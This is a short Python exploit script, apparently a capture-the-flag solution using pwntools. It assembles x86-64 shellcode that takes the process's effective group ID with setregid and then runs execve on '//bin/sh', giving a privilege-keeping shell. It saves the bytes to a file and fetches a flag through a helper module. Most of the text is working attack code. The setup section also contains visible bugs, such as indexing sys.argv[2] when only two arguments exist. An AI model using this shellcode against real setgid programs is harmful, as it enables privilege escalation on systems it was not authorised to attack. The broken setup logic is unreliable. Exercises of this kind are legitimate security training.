#!/usr/bin/env python
from pwn import *
import pwn
import helpers

########################################################
# Exploit
########################################################

arch = 'x86-64'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here

    push $0x6c 
    pop %rax
    syscall
                
    mov %rax, %rsi
    mov %rax, %rdi

    push $0x72
    pop %rax
    syscall

    xor %rsi, %rsi
    xor %rdx, %rdx
    push $0x3b
    pop %rax

    mov $0x68732f6e69622f2f, %rbx
    push %rsi
    push %rbx
    mov %rsp, %rdi

    syscall
'''
compiled = asm(shellcode, arch=arch)
print(compiled)

with open('shellcode.bin', 'wb') as f:
    f.write(compiled)

########################################################
# Setup                                                #
########################################################
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = pwn.ELF(prog)
flag = helpers.get_flag(elf,"")
pwn.info(f'Flag: {flag}')
